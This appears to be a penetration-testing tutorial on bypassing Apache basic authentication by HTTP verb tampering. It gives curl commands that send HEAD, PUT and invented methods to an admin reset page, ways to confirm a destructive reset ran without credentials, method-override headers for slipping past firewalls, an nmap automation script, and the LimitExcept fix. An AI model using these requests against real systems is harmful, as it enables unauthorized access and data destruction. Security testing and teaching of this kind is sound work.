# Bypassing Basic Authentication via HTTP Verb Tampering

The core exploit is straightforward: if a server's authentication configuration only names GET and POST in its access control rules, any other HTTP method that the server accepts bypasses those rules entirely. The server handles the request but never checks credentials because the authentication directive was never written to cover that method. 
***

## Phase 1: Reconnaissance with OPTIONS

Before attempting any bypass, identify which methods the target server accepts. An OPTIONS request returns the `Allow` header listing every supported method:

```bash
# Enumerate accepted methods
curl -i -X OPTIONS http://target.com/admin/reset.php

HTTP/1.1 200 OK
Allow: POST,OPTIONS,HEAD,GET
Content-Length: 0

# One-liner to extract just the Allow header
curl -si -X OPTIONS http://target.com/ | grep -i allow
```

The presence of HEAD in the `Allow` response is the primary indicator that this bypass is likely exploitable. HEAD is accepted by default in Apache, JBoss, WebSphere, and Tomcat without explicit configuration, meaning most servers are potentially vulnerable if their auth configurations do not explicitly cover it. 

***

## Phase 2: Testing Each Method

Work through each accepted method systematically, starting with HEAD since it is the most commonly overlooked in `<Limit>` directives:

```bash
# Baseline: confirm GET is protected
curl -i http://target.com/admin/reset.php
# → 401 Unauthorized (expected)

# Test POST
curl -i -X POST http://target.com/admin/reset.php
# → 401 or 200?

# Test HEAD (most likely bypass)
curl -i -X HEAD http://target.com/admin/reset.php
# → 200 with no body (HEAD never returns a body)

# Test arbitrary verb (many PHP/Apache configs treat unknown as GET)
curl -i -X ANYTHING http://target.com/admin/reset.php
# → 200 if server passes unknown methods to GET handler

# Test other standard methods
curl -i -X PUT http://target.com/admin/reset.php
curl -i -X DELETE http://target.com/admin/reset.php
curl -i -X PATCH http://target.com/admin/reset.php
```

The HEAD response deserves special attention: a 200 status with empty body and no `WWW-Authenticate` header confirms authentication was bypassed. The function still executes server-side even though no body is returned in the response. 

**In Burp Suite:** Right-click the intercepted request in Proxy or Repeater, select "Change Request Method" to toggle between GET and POST automatically, or manually edit the method field to HEAD, PUT, or any arbitrary string.

***

## Phase 3: Confirming Function Execution

Since HEAD returns no response body, confirming the action executed requires observing its side effects rather than reading output:

```bash
# Step 1: Verify the protected function works with credentials (baseline)
curl -u admin:password http://target.com/admin/reset.php
# Observe: files deleted, state changed

# Step 2: Restore state, then attempt HEAD bypass without credentials
curl -X HEAD http://target.com/admin/reset.php
# Response: 200 with empty body, no WWW-Authenticate header

# Step 3: Confirm execution by checking side effects
curl http://target.com/
# Observe: files are deleted, confirming HEAD executed the reset function
```

***

## Why HEAD Bypasses `<Limit>` Configurations

The Apache `<Limit>` directive only applies the enclosed rules to the listed methods. Any method not listed is processed by the server's default handler with no restrictions applied: 

```xml
<!-- This configuration: -->
<Limit GET POST>
    Require valid-user
</Limit>

<!-- Means:
     GET  → requires authentication
     POST → requires authentication
     HEAD → no restriction (not listed)
     PUT  → no restriction (not listed)
     INVENTED → no restriction (not listed)
-->

<!-- Secure configuration using LimitExcept instead: -->
<LimitExcept OPTIONS>
    Require valid-user
</LimitExcept>
<!-- Now: ALL methods except OPTIONS require authentication -->
```

The `LimitExcept` directive inverts the logic: it applies rules to everything except the listed methods, which is the correct approach because it is secure by default. New methods or arbitrary strings are covered automatically. 
***

## Method Override Headers

Some frameworks and proxies support method override headers that instruct the server to treat a POST request as a different method. These can bypass restrictions that check the actual HTTP verb: 

```http
POST /admin/reset.php HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET
X-HTTP-Method: DELETE
X-Method-Override: PUT
```

If the application framework honours these headers, it processes the request as the overridden method while the server-level authentication still sees a POST. This is particularly useful when firewalls or WAFs block non-standard HTTP verbs but the application framework reads the override header.

***

## Nmap Automation

The `http-method-tamper` NSE script automates detection across an entire site: 
# Scan single endpoint
nmap -p 80,443 --script http-method-tamper \
     --script-args 'http-method-tamper.paths={/admin/,/admin/reset.php}' \
     target.com

# Let nmap crawl and find protected pages automatically
nmap -p 80 --script http-method-tamper target.com
```

The script tries HEAD, POST, and a random arbitrary method against each protected resource and reports which bypass succeeds for each path.
